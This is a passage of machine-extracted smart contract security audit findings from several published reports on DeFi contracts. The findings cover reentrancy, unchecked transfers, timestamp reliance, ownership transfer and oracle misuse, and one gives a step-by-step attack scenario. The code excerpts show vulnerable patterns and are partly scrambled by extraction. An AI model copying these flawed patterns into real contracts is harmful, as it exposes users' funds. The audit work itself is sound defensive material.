Impact - 1 25 Recommendations: In the withdrawPredictionStake function, ledgerL and ledgerH should be updated before an external call. Remediation Plan: SOLVED: External call is currently done after ledgerL and ledgerH are updated. 26 ", "labels": ["Halborn", "WolfyStreetBets", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/WolfyStreetBets_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In the public functions, array arguments are immediately copied to mem- ory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Also, methods do not necessarily have to be public if they are only called within the contract-in such case they should be marked internal. Affected Smart Contract Functions: WolfyStreetBetsV1: provideLiquidity,withdrawPredictionStake,stake,stopPool,startPool,setWinFactorL ,setWinFactorH,setTrustedForwarder Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider as much as possible declaring external variables instead of public variables. As for best practice, you should use external if you expect that the function will only be called externally and use public if you need to call the function internally. To sum up, all can access to public functions, external functions only can be accessed externally and internal functions can only be called within the contract. 27 Remediation Plan: SOLVED: WOLFY Team declared an external instead of public in the suggested functions. 28 ", "labels": ["Halborn", "WolfyStreetBets", "Severity: Informational"]}, {"title": "IMPROPER INPUT VALIDATION ON THE PREDICTION ASSETS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/WolfyStreetBets_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In the WolfyStreetBetsV1.sol contract, after providing liquidity to the The startPool function takes two pool, an owner can start the pool. argument named as _predictionAsset1 and _predictionAsset2. However, these function arguments are not validated. Code Location: Listing 10: WolfyStreetBetsV1.sol (Lines ) 668 function startPool ( uint256 _predictionAsset1 , uint256 _predictionAsset2 ) public { 669 670 671 672 673 674 675 676 677 678 679 680 681 682 683 684 require (! poolStarted , \" Previous pool not finalized yet \" ); require ( totalLiquidityLowRisk + liquidityDetailsOwner . _lowRisk > 0 ,\" Low Risk Pool : Please add liquidity \" ); require ( totalLiquidityHighRisk + liquidityDetailsOwner . _highRisk > 0 ,\" High Risk Pool : Please add liquidity \") ; // 30 minutes for testing ONLY require ( block . timestamp > liquidityCycleStartTime . add (30 minutes ) , \" Cannot start pool during liquidity cycle \" ); // PLEASE UNCOMMENT ME FOR MAINNET // require ( block . timestamp > liquidityCycleStartTime . add (12 hours ) , \" Cannot start pool during liquidity cycle \") ; predictionAsset1 = _predictionAsset1 ; predictionAsset2 = _predictionAsset2 ; poolStartTime = block . timestamp ; poolStarted = true ; liquidityCycle = false ; } 29 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider to validate function arguments. To preventing miscalculation, these function arguments should be more than zero. Remediation Plan: SOLVED: WOLFY Team added validation in the function arguments. 30 ", "labels": ["Halborn", "WolfyStreetBets", "Severity: Informational"]}, {"title": "REDUNDANT STATEMENT ON THE REWARD MANAGER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/WolfyStreetBets_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "the contract, WolfyStreetBetsV1.sol func- In tion adjusts pool balances due to risk score. On the function, previousResultRecord variable has been used for keeping record results. But, these records are not used in the contract. The redundant statements will spend gas more. manager reward the Code Location: Listing 11: WolfyStreetBetsV1.sol (Lines ) 812 813 814 815 816 817 818 819 820 821 822 823 824 ... if ( _factor >= winFactorL && _res == true ) { // LR | PROFIT => +12% for ( uint i = 0 ; i < _lowRiskUsers . length ; i ++) { if ( liquidityDetailsOwner . _lowRisk >= _poolBalances [ _lowRiskUsers [ i ]][ true ]. mul (120) . div (1000) ) { liquidityDetailsOwner . _lowRisk -= _poolBalances [ _lowRiskUsers [i ]][ true ]. mul (120) . div (1000) ; _profitStakers [ _lowRiskUsers [ i ]][ true ] += _poolBalances [ _lowRiskUsers [i ]][ true ]. mul (120) . div (1000) ; _poolBalances [ _lowRiskUsers [ i ]][ true ] += _poolBalances [ _lowRiskUsers [i ]][ true ]. mul (120) . div (1000) ; previousResultRecord . push ( ResultRecord ( true , true )) ; } else { liquidityDetailsOwner . _lowRisk = 0; _profitStakers [ _lowRiskUsers [ i ]][ true ] += _poolBalances [ _lowRiskUsers [i ]][ true ]. mul (120) . div (1000) ; _poolBalances [ _lowRiskUsers [ i ]][ true ] += _poolBalances [ _lowRiskUsers [i ]][ true ]. mul 31 (120) . div (1000) ; previousResultRecord . push ( ResultRecord ( true , true )) ; 825 826 827 828 } } ... } Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider to delete redundant statements from the contract. Remediation Plan: ACKNOWLEDGED: WOLFY Team claims that the use of previousResultRecord is intended in the code because it is returned in a view function for front-end proposes. 32 3.10 (HAL-10) MISUSE OF GAS ON THE PAYOUTOWNERLIQUIDITY FUNCTION - INFORMATIONAL ", "labels": ["Halborn", "WolfyStreetBets", "Severity: Informational"]}, {"title": "UNCHECKED TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KwikSwap_Factory_Contract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "contracts Kiwkswap Router02.sol has The removeLiquidity() method and in this method, transferFrom() is being Several called without any implementing checks on the return value. tokens do not revert in case of failure and return false. Kwikswap Router01.sol and Code Location: Listing 1: Kiwkswap Router02.sol (Lines 484) 483 484 485 486 address pair = KwikswapV1Library . pairFor ( factory , tokenA , tokenB ); IKwikswapV1Pair ( pair ). transferFrom ( msg . sender , pair , liquidity ); // send liquidity to pair ( uint amount0 , uint amount1 ) = IKwikswapV1Pair ( pair ). burn ( to ); ( address token0 ,) = KwikswapV1Library . sortTokens ( tokenA , tokenB ); Listing 2: Kwikswap Router01.sol (Lines 466) 465 466 467 468 address pair = KwikswapV1Library . pairFor ( factory , tokenA , tokenB ); IKwikswapV1Pair ( pair ). transferFrom ( msg . sender , pair , liquidity ); // send liquidity to pair ( uint amount0 , uint amount1 ) = IKwikswapV1Pair ( pair ). burn ( to ); ( address token0 ,) = KwikswapV1Library . sortTokens ( tokenA , tokenB ); 13 Risk Level: Likelihood - 3 Impact - 3 Recommendation: Use SafeERC20, or ensure that the transferFrom return value is checked. Remediation Plan: SOLVED: Contracts Kiwkswap Router02 and Kiwkswap Router01 are now using SafeERC20. 14 ", "labels": ["Halborn", "KwikSwap_Factory_Contract", "Severity: Medium"]}, {"title": "PRAGMA VERSION DEPRECATED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KwikSwap_Factory_Contract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "The current version in use for the contracts is pragma =0.5.12 for KwikswapV1ERC20.sol, KwikswapV1Factory.sol and KwikswapV1Pair.sol while =0.6.6 for Kiwkswap Router02.sol and Kwikswap Router01.sol. While these version is still functional, and most security issues safely implemented by mitigating contracts with other utility contracts such as SafeMath.sol and ReentrancyGuard.sol, the risk to the long-term sustainability and integrity of the solidity code increases. Code Location: Listing swapV1Pair.sol 3: KwikswapV1ERC20.sol, KwikswapV1Factory.sol and Kwik- 59 pragma solidity =0.5.16; Listing 4: Kiwkswap Router02.sol and Kwikswap Router01.sol 59 pragma solidity =0.6.6; Risk Level: Likelihood - 1 Impact - 3 Recommendations: At the time of this audit, the current version is already at 0.8.2. When possible, use the most updated and tested pragma versions to take advantage of new features that provide checks and accounting, as well as prevent insecure use of code. (0.6.12) 15 Remediation Plan: RISK ACCEPTED: Kwikswap team wants to continue with this pragma version. 16 ", "labels": ["Halborn", "KwikSwap_Factory_Contract", "Severity: Low"]}, {"title": "USE OF BLOCK.TIMESTAMP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KwikSwap_Factory_Contract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "During a manual static review, the tester noticed the use of block. timestamp in KwikswapV1ERC20.sol and KwikswapV1Pair.sol contracts. The contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of now creates a risk that time manipulation can be performed to manipulate price oracles. Miners can modify the timestamp by up to 900 seconds. Code Location: Listing 5: KwikswapV1ERC20.sol (Lines 82) 81 82 83 84 85 86 87 88 function permit ( address owner , address spender , uint value , uint deadline , uint8 v , bytes32 r , bytes32 s) external { require ( deadline >= block . timestamp , ' KwikswapV1 : EXPIRED ' ); bytes32 digest = keccak256 ( abi . encodePacked ( '\\ x19 \\ x01 ' , DOMAIN_SEPARATOR , keccak256 ( abi . encode ( PERMIT_TYPEHASH , owner , spender , value , nonces [ owner ]++ , deadline )) ) Listing 6: KwikswapV1Pair.sol (Lines 77) 73 74 75 76 77 function _update ( uint balance0 , uint balance1 , uint112 _reserve0 , uint112 _reserve1 ) private { require ( balance0 <= uint112 ( -1) && balance1 <= uint112 ( -1) , ' KwikswapV1 : OVERFLOW '); uint32 blockTimestamp = uint32 ( block . timestamp % 2**32) ; uint32 timeElapsed = blockTimestamp - blockTimestampLast ; // overflow is desired if ( timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) { 17 Risk Level: Likelihood - 1 Impact - 4 Recommendation: Use block.number instead of block.timestamp to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: SOLVED: Contracts KwikswapV1Pair and KwikswapV1ERC20 are now using block .number instead of block.timestamp. 18 ", "labels": ["Halborn", "KwikSwap_Factory_Contract", "Severity: Low"]}, {"title": "MISSING ZERO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KwikSwap_Factory_Contract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "contracts KwikswapV1Factory.sol, Kiwkswap The Router02.sol and Kwikswap Router01.sol should perform a zero-address validation check when assigning the user supplied address values to state variables. KwikswapV1Pair.sol, Code Location: Listing 7: KwikswapV1Factory.sol (Lines 16) 15 16 17 constructor ( address _feeToSetter ) public { feeToSetter = _feeToSetter ; } Listing 8: KwikswapV1Factory.sol (Lines 42) 40 41 42 43 function setFeeTo ( address _feeTo ) external { require ( msg . sender == feeToSetter , ' KwikswapV1 : FORBIDDEN ' ); feeTo = _feeTo ; } Listing 9: KwikswapV1Factory.sol (Lines 47) 45 46 47 48 function setFeeToSetter ( address _feeToSetter ) external { require ( msg . sender == feeToSetter , ' KwikswapV1 : FORBIDDEN ' ); feeToSetter = _feeToSetter ; } 19 Listing 10: KwikswapV1Pair.sol (Lines 68,69) 66 67 68 69 70 function initialize ( address _token0 , address _token1 ) external { require ( msg . sender == factory , ' KwikswapV1 : FORBIDDEN '); // sufficient check token0 = _token0 ; token1 = _token1 ; } Listing 11: Kiwkswap Router02.sol (Lines 395,396) 394 395 396 397 constructor ( address _factory , address _WETH ) public { factory = _factory ; WETH = _WETH ; } Listing 12: Kwikswap Router01.sol (Lines 378,379) 377 378 379 380 constructor ( address _factory , address _WETH ) public { factory = _factory ; WETH = _WETH ; } Risk Level: Likelihood - 2 Impact - 2 Recommendation: Add address validation for user-supplied values in addition to the existing OpenZeppelin RBAC controls. Remediation Plan: SOLVED: Contracts KwikswapV1Pair, KwikswapV1Factory, Kwikswap Router01 and Kiwkswap Router02 added address validation for user-supplied values. 20 ", "labels": ["Halborn", "KwikSwap_Factory_Contract", "Severity: Low"]}, {"title": "IGNORE RETURN VALUES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KwikSwap_Factory_Contract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "The return value of an external call is not stored in a local or state variable. In the contracts Kiwkswap Router02.sol and Kwikswap Router01. sol, there are instances where external methods are being called and the return value is being ignored. Code Location: Listing 13: Kiwkswap Router02.sol (Lines 414) 413 414 415 416 if ( IKwikswapV1Factory ( factory ). getPair ( tokenA , tokenB ) == address (0) ) { IKwikswapV1Factory ( factory ). createPair ( tokenA , tokenB ) ; } ( uint reserveA , uint reserveB ) = KwikswapV1Library . getReserves ( factory , tokenA , tokenB ); Listing 14: Kwikswap Router01.sol (Lines 397) 396 397 398 399 if ( IKwikswapV1Factory ( factory ). getPair ( tokenA , tokenB ) == address (0) ) { IKwikswapV1Factory ( factory ). createPair ( tokenA , tokenB ) ; } ( uint reserveA , uint reserveB ) = KwikswapV1Library . getReserves ( factory , tokenA , tokenB ); Risk Level: Likelihood - 3 Impact - 2 21 Recommendation: Add a return value check to avoid unexpected errors. Return value checks ensure proper exception handling. Remediation Plan: SOLVED: Contracts Kwikswap Router01 and Kwikswap Router02 added a return value check to avoid unexpected errors. 22 ", "labels": ["Halborn", "KwikSwap_Factory_Contract", "Severity: Low"]}, {"title": "MISSING RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KwikSwap_Factory_Contract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdraw function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against reentrancy attacks. Risk Level: Likelihood - 1 Impact - 1 Recommendation: In the KwikswapV1Pair.sol and KwikswapV1Factory.sol contracts, functions like KwikswapV1Pair.burn(), KwikswapV1Pair.swap() and KwikswapV1Factory Use the nonReentrant .createPair() are missing nonReentrant guard. modifier to avoid introducing future vulnerabilities. Remediation Plan: RISK ACCEPTED: Kwikswap team are fine with not adding nonReenrant guard in their contracts. 23 ", "labels": ["Halborn", "KwikSwap_Factory_Contract", "Severity: Informational"]}, {"title": "POSSIBILITY TO WITHDRAW TERRASWAP LP TOKENS AFTER CLAIMING REWARDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Periphery_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "contract- handle_claim_rewards_and_unlock_for_lockup if users s/lockdrop/src/contract.rs state.are_claims_allowed is set to true. However, if the claiming is enabled too early (i.e.: before deposit and withdrawal windows), users will even be able to withdraw their Terraswap LP tokens after claiming rewards. function claim in their rewards allow to Attack scenario: 1. Owner deploys lockdrop, auction and airdrop contracts. In particu- lar, init_timestamp for auction contract is incorrectly set. 2. As part of usual protocol working, users deposit UST to auction contract during its deposit window. 3. As part of usual protocol working, users claim rewards (ASTRO tokens) in airdrop contract and their claimed_amount increase. 15 4. As part of usual protocol working, users delegate ASTRO tokens to auction contract. 5. Once deposit and withdrawal windows finish for auction contract, owner can initialize pool, which enables claims for lockdrop and airdrop contracts. 6. Users increase lockup position size in lockdrop contract and claim rewards (ASTRO tokens). 7. Finally, users can withdraw their Terraswap LP tokens from lockdrop contract and keep their rewards. A proof of concept video showing how to exploit this security issue is included in the report. It is important to mention that this situation can happen under the following circumstances:  init_timestamp in auction contract is incorrectly set, see HAL-03 for more details.  init_timestamp in lockdrop contract is incorrectly set.  Deposit / withdrawal windows are incorrectly set in lockdrop or auction contracts. Code Location: The function only verifies if state.are_claims_allowed is set to true before allowing users claim their rewards. Listing 1: contracts/lockdrop/src/contract.rs (Lines 892) 882 pub fn handle_claim_rewards_and_unlock_for_lockup ( 883 884 885 886 887 888 mut deps : DepsMut , env : Env , info : MessageInfo , terraswap_lp_token : String , duration : u64 , withdraw_lp_stake : bool , 16 let state = STATE . load ( deps . storage ) ?; 889 ) -> StdResult < Response > { 890 891 892 893 if !state . are_claims_allowed { return Err ( StdError :: generic_err (\" Reward claim not allowed 894 895 896 897 898 899 \" )); } let config = CONFIG . load ( deps . storage ) ?; let user_address = info . sender ; let terraswap_lp_token = deps . api . addr_validate (& terraswap_lp_token ) ?; Risk Level: Likelihood - 3 Impact - 5 Recommendations: Add a restriction in handle_claim_rewards_and_unlock_for_lockup function to throw an error message if claiming in lockdrop contract is made before deposit and withdrawal windows. Remediation plan: SOLVED: The issue was fixed in commit f20d8471b8ef5325d56a556f3a1953185ddc4145. 17 ", "labels": ["Halborn", "Astroport_fi_Periphery_Contracts_CosmWasm", "Severity: High"]}, {"title": "PRIVILEGED ADDRESS CAN BE TRANSFERRED WITHOUT CONFIRMATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Periphery_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "An incorrect use of the handle_update_config function in contracts can set owner to an invalid address and inadvertently lose control of the contracts, which cannot be undone in any way. Currently, the owner of the contracts can change owner address using the aforementioned function in a single transaction and without confirmation from the new address. The affected smart contracts are the following:  airdrop  auction  lockdrop Code Location: Listing 2: contracts/airdrop/src/contract.rs (Lines 143) 142 if let Some ( owner ) = owner { 143 144 145 } config . owner = deps . api . addr_validate (& owner ) ?; attributes . push ( attr ( \" new_owner \" , owner . as_str () )) Listing 3: contracts/auction/src/contract.rs (Lines 178) 176 // UPDATE :: ADDRESSES IF PROVIDED 177 if let Some ( owner ) = new_config . owner { 178 179 180 } config . owner = deps . api . addr_validate (& owner ) ?; attributes . push ( attr ( \" owner \" , config . owner . to_string () )) ; 18 Listing 4: contracts/lockdrop/src/contract.rs (Lines 249) 248 if let Some ( owner ) = new_config . owner { 249 250 251 }; config . owner = deps . api . addr_validate (& owner ) ?; attributes . push ( attr ( \" new_owner \" , owner . as_str () )) Risk Level: Likelihood - 2 Impact - 4 Recommendations: It is recommended to split owner transfer functionality into set_owner and accept_ownership functions. The latter function allows the transfer to be completed by the recipient. Remediation plan:: RISK ACCEPTED: The Astroport team accepted the risk for this finding. 19 ", "labels": ["Halborn", "Astroport_fi_Periphery_Contracts_CosmWasm", "Severity: Medium"]}, {"title": "INITIAL TIMESTAMPS DO NOT HAVE A MINIMUM THRESHOLD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Periphery_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "instantiate function in contracts does not verify that initial timestamps (from_timestamp, init_timestamp) are greater than current timestamp. As a consequence, if contracts are deployed with inaccurate initial timestamps could generate unexpected situations, e.g.: possibility to withdraw Terraswap LP tokens after claiming rewards, see HAL-01 for more details. The affected smart contracts are the following:  airdrop  auction Code Location: Listing 5: contracts/airdrop/src/contract.rs (Lines 50) 46 let config = Config { 47 48 owner , astro_token_address : deps . api . addr_validate (& msg . astro_token_address )? , merkle_roots : msg . merkle_roots . unwrap_or_default () , from_timestamp , to_timestamp : msg . to_timestamp , auction_contract_address : None , are_claims_enabled : false , 49 50 51 52 53 54 }; Listing 6: contracts/auction/src/contract.rs (Lines 52) 39 let config = Config { owner : msg 40 . owner 41 . map (| v | deps . api . addr_validate (& v )) 42 . transpose () ? 43 20 . unwrap_or ( info . sender ) , astro_token_address : deps . api . addr_validate (& msg . astro_token_address )? , airdrop_contract_address : deps . api . addr_validate (& msg . airdrop_contract_address )? , lockdrop_contract_address : deps . api . addr_validate (& msg . lockdrop_contract_address )? , pool_info : None , generator_contract : None , astro_incentive_amount : None , lp_tokens_vesting_duration : msg . lp_tokens_vesting_duration , init_timestamp : msg . init_timestamp , deposit_window : msg . deposit_window , withdrawal_window : msg . withdrawal_window , 44 45 46 47 48 49 50 51 52 53 54 55 }; Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended to update the logic of instantiate function in contracts mentioned above to validate that initial timestamps (from_timestamp, init_timestamp) are greater than current timestamp. Remediation plan:: RISK ACCEPTED: The Astroport team accepted the risk for this finding. 21 ", "labels": ["Halborn", "Astroport_fi_Periphery_Contracts_CosmWasm", "Severity: Low"]}, {"title": "OWNER CAN INITIALIZE REPEATED POOLS IN LOCKDROP CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Periphery_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "handle_initialize_pool function in contracts/lockdrop/src/contract.rs allows the possibility that owner mistakenly initializes repeated pools in lockdrop contract. This issue happens because may_load function will consider that two terraswap_lp_token addresses are different if they differ just in their upper / lower cases. The situation described above could generates unexpected situations, e.g.: a user could increase size of an unintended lockup position. Code Location: Listing 7: contracts/lockdrop/src/contract.rs (Lines 344,345) 341 let terraswap_lp_token = deps . api . addr_validate (& terraswap_lp_token ) ?; if ASSET_POOLS 342 343 // CHECK ::: Is LP Token Pool already initialized 344 345 346 347 348 349 . may_load ( deps . storage , & terraswap_lp_token )? . is_some () } { return Err ( StdError :: generic_err (\" Already supported \" )) ; Risk Level: Likelihood - 1 Impact - 3 22 Recommendations: Update the logic of handle_initialize_pool to turn terraswap_lp_token address into lowercase before calling may_load function. Remediation plan:: RISK ACCEPTED: The Astroport team accepted the risk for this finding. 23 ", "labels": ["Halborn", "Astroport_fi_Periphery_Contracts_CosmWasm", "Severity: Low"]}, {"title": "INCENTIVES SHARE CAN BE CHANGED UNRESTRICTEDLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Periphery_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "handle_update_pool function in contracts/lockdrop/src/contract.rs allows owner to change incentives share (incentives_share) unrestrictedly in If this value is changed to a lower one after lockdrop contract. init_timestamp, it could reduce rewards for users that have already deposited Terraswap LP tokens. Code Location: Listing 8: contracts/lockdrop/src/contract.rs (Lines 402,418) 402 if env . block . time . seconds () >= config . init_timestamp + config . \" Pools cannot be updated post deposit window closure \" , deposit_window { return Err ( StdError :: generic_err ( 403 404 405 406 } 407 408 let terraswap_lp_token = deps . api . addr_validate (& )); terraswap_lp_token ) ?; 409 410 // CHECK ::: Is LP Token Pool initialized 411 let mut pool_info = ASSET_POOLS . load ( deps . storage , & terraswap_lp_token ) ?; 412 413 // update total incentives 414 state . total_incentives_share = 415 state . total_incentives_share - pool_info . incentives_share + incentives_share ; 416 417 // Update Pool Incentives 418 pool_info . incentives_share = incentives_share ; 419 420 ASSET_POOLS . save ( deps . storage , & terraswap_lp_token , & pool_info ) ?; 421 STATE . save ( deps . storage , & state ) ?; 24 Risk Level: Likelihood - 1 Impact - 3 Recommendations: It is recommended to not allow changes to incentives_share after init_timestamp. Otherwise, do not allow lower values if someone has already deposited. Remediation plan: SOLVED: The issue was fixed in commit f20d8471b8ef5325d56a556f3a1953185ddc4145. 25 ", "labels": ["Halborn", "Astroport_fi_Periphery_Contracts_CosmWasm", "Severity: Low"]}, {"title": "MAXIMUM THRESHOLD FOR SLIPPAGE IS NOT ENFORCED WHEN ADDING LIQUIDITY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Periphery_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When owner calls handle_init_pool function in contracts/auction/src/con- tract.rs to add liquidity and do not specify slippage tolerance in the operation, Astroport AMM protocol does not enforce a default maximum threshold, which could affect the amount of tokens received in return. However, this is an unlikely scenario because the operation is executed before users other than owner are able to claim their ASTRO tokens to provide liquidity to ASTRO-UST pool. Code Location: The slippage argument was directly provided to the build_provide_liquidity_ to_lp_pool_msg function without any previous validation. Listing 9: contracts/auction/src/contract.rs (Lines 478) 472 msgs . push ( build_provide_liquidity_to_lp_pool_msg ( 473 474 475 476 477 478 479 ) ?) ; deps . as_ref () , config . astro_token_address , astro_ust_pool_address , ust_coin . amount , state . total_astro_delegated , slippage , Risk Level: Likelihood - 1 Impact - 2 26 Recommendation: It is recommended to enforce the use of a default maximum threshold for slippage in handle_init_pool function. As a reference, max slippage for Uniswap Pool is 50%. Remediation plan:: ACKNOWLEDGED: The Astroport team acknowledged this finding. 27 ", "labels": ["Halborn", "Astroport_fi_Periphery_Contracts_CosmWasm", "Severity: Informational"]}, {"title": "AUCTION ADDRESS CANNOT BE CHANGED IF SET WITH AN ERRONEOUS VALUE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Periphery_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "handle_update_config function in contracts does not allow owner to change auction address if set with an erroneous value. As a consequence, users wont be able to delegate their ASTRO tokens and operations will always throw error messages. The affected smart contracts are the following:  airdrop  lockdrop Code Location: Listing 10: contracts/airdrop/src/contract.rs 147 if let Some ( auction_contract_address ) = auction_contract_address { 148 149 150 return Err ( StdError :: generic_err ( \" Auction contract match config . auction_contract_address { Some (_ ) => { 151 152 153 154 155 already set . \")) ; } None => { config . auction_contract_address = Some ( deps . api . addr_validate (& auction_contract_address ) ?) ; attributes . push ( attr (\" auction_contract \" , auction_contract_address )) 156 157 158 } } } 28 Listing 11: contracts/lockdrop/src/contract.rs 258 if let Some ( auction ) = new_config . auction_contract_address { 259 260 261 return Err ( StdError :: generic_err ( \" Auction contract match config . auction_contract { Some (_ ) => { already set . \")) ; } None => { config . auction_contract = Some ( deps . api . addr_validate (& auction ) ?) ; attributes . push ( attr (\" auction_contract \" , auction )) } } 262 263 264 265 266 267 268 }; Risk Level: Likelihood - 1 Impact - 2 Recommendations: It is recommended to allow changes to auction address in contracts before initial timestamps (from_timestamp, init_timestamp). Remediation plan:: ACKNOWLEDGED: The Astroport team acknowledged this finding. 29 ", "labels": ["Halborn", "Astroport_fi_Periphery_Contracts_CosmWasm", "Severity: Informational"]}, {"title": "ASSETS WITHDRAWN FROM TERRASWAP SHOULD MATCH ASSETS IN ASTROPORT POOL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Periphery_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "handle_migrate_liquidity function in contracts/lockdrop/src/contract.rs does not ensure that assets to withdraw from Terraswap match assets in Astroport pool. This security issue is considered as informational because the validation is done in Astroport AMM protocol and operations will always throw error messages. However, from a security in depth perspective, validation should not rely only in external components (AMM protocol in this case) and should be enforced in lockdrop contract, too. Code Location: Listing 12: contracts/lockdrop/src/contract.rs (Lines 541,543) 540 // COSMOS MSG :: CALLBACK AFTER LIQUIDITY WITHDRAWAL 541 let update_state_msg = CallbackMsg :: WithdrawLiquidityFromTerraswapCallback { terraswap_lp_token : terraswap_lp_token . clone () , astroport_pool : astroport_pool . clone () , prev_assets : assets . try_into () . unwrap () , 542 543 544 545 } 546 . to_cosmos_msg (& env ) ?; 547 cosmos_msgs . push ( update_state_msg ); Risk Level: Likelihood - 1 Impact - 2 30 Recommendations: Update the logic of handle_migrate_liquidity function to ensure that assets to withdraw from Terraswap match assets in Astroport pool. Remediation plan:: ACKNOWLEDGED: The Astroport team acknowledged this finding. 31 ", "labels": ["Halborn", "Astroport_fi_Periphery_Contracts_CosmWasm", "Severity: Informational"]}, {"title": "POTENTIAL INCONSISTENCY IN TOTAL AIRDROP SIZE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Periphery_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "instantiate function in contracts/airdrop/src/contract.rs does not val- idate that total_airdrop_size has the same value than amount of ASTRO tokens transferred to aidrop contract, which could create an inconsistency in case an inaccurate amount of ASTRO tokens are transferred. Code Location: Listing 13: contracts/airdrop/src/contract.rs (Lines 57) 56 let state = State { 57 58 59 60 }; total_airdrop_size : msg . total_airdrop_size , total_delegated_amount : Uint128 :: zero () , unclaimed_tokens : msg . total_airdrop_size , Risk Level: Likelihood - 1 Impact - 2 Recommendations: Create a separate function in contract to update total_airdrop_size when called by ASTRO token contract through a Cw20ReceiveMsg message. Remediation plan:: SOLVED: The issue was fixed in commit c61cc86c9ce86b2175ff70d1070ba9ae17013a53. 32 3.10 (HAL-10) POTENTIAL DIVISION BY ZERO - INFORMATIONAL ", "labels": ["Halborn", "Astroport_fi_Periphery_Contracts_CosmWasm", "Severity: Informational"]}, {"title": "MISUSE OF AN ORACLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "SimplePriceOracle.sol is calling latestAnswer to get the last asset price. This method will return the last value, but it will not allow to check if the data is fresh. On the other hand, calling the method latestRoundData allows to run additional validation. Code Location: SimplePriceOracle.sol Lines# 44-142 Listing 1 1 2 3 4 5 6 7 8 9 10 11 12 function getUnderlyingPrice ( CToken cToken ) public view returns ( uint256 ) { // if (! isStockAsset [ _asset ]) { if ( compareStrings ( cToken . symbol () , \" cETH \")) { address _aggregator = aggregator [ bnbUnderlying ]; ( MathError error , uint256 price ) = mulUInt ( uint256 ( AccessControlledAggregator ( _aggregator ). latestAnswer () ) , 10**10 ); assert ( error == MathError . NO_ERROR ); return price ; } [ Redacted for brevity ] Recommendation: It is recommended to use the latestRoundData function to retrieve an assets price instead. Checks on the return data should be introduced with proper revert messages if the price is stale or the round is uncomplete. For example: 15 Listing 2 1 2 3 4 5 6 7 8 9 10 ( roundId , rawPrice , , updateTime , answeredInRound ) = AccessControlledAggregator ( _aggregator ). latestRoundData () ; require ( rawPrice > 0, \" Chainlink price <= 0 \"); require ( updateTime != 0 , \" Incomplete round \" ); require ( answeredInRound >= roundId , \" Stale price \" ); Remediation Plan: SOLVED : EasyFi team replaced the API latestAnswer with latestRoundData in all instances. 16 ", "labels": ["Halborn", "EasyFi_Lending", "Severity: Medium"]}, {"title": "FLOATING PRAGMA", 